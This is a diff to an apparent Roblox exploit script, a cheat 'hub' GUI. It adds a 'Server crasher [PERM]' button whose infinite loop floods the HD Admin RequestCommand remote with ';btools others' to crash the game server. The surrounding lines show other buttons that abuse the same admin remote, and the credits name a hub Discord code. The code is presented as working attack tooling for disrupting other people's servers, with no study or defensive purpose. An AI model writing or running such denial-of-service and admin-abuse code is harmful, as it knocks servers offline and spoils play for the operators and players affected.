@@ -161,6 +161,18 @@ local args = {
 game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
 end)
 
+Section:NewButton("Server crasher [PERM]", "Crash server", function()
+    print("enabled server crasher")
+		while true do
+			local args = {
+				[1] = ";btools others"
+			}
+			game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+		end
+end)
+
+
+
 local Tab = Window:NewTab("Admin")
 local Section = Tab:NewSection("Gears and stuff")
 
@@ -260,4 +272,3 @@ local Section = Tab:NewSection("cool credits")
 Section:NewLabel("bbb908 for making most of the stuff")
 Section:NewLabel("like anti-mute and others")
 Section:NewLabel("GG Hub server: bP7X9HsH")
-
